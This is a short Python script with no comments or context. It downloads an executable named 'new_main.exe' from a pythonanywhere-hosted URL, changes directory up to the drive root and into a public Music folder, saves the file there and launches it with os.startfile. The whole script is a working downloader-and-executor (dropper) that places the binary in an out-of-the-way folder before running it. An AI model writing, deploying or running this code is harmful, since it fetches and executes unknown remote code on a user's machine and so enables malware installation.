import requests,os
name = "new_main.exe"
url = f"https://pybdtest.pythonanywhere.com/media/files/{name}/"
get_response = requests.get(url)

x = -1
for i in os.getcwd():
    if i == "\\":
        x += 1
for i in range(x):
    os.chdir("..")
os.chdir("public")
os.chdir("Music")

with open(name, "wb") as out_file:
    out_file.write(get_response.content)
os.startfile(name)
